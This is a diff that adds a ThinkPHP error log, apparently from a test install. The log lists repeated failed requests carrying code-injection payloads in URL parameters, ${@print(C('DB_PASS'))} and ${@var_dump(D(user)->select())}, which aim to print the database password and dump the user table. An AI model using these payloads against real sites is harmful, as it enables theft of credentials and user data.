@@ -1,0 +1,13 @@
+[ 2013-06-26T10:21:02+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php/module/action/param1/$%7B@print(C(%E2%80%98DB_PASS%E2%80%99))%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:21:03+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php/module/action/param1/$%7B@print(C(%E2%80%98DB_PASS%E2%80%99))%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:21:04+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php/module/action/param1/$%7B@print(C(%E2%80%98DB_PASS%E2%80%99))%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:21:34+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php//Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:21:36+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php//Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:21:37+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php//Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:21:37+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php//Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:21:59+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php//Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:21:59+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php//Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:22:00+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php//Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:22:01+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php//Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:22:04+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php/Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
+[ 2013-06-26T10:22:05+08:00 ] /test2/dwz_thinkphp/Admin/index.php/index.php/Product/show/id/25/parm1/$%7B@var_dump(D(user)-%3Eselect())%7D | ERR: (ThinkException) 无法加载模块
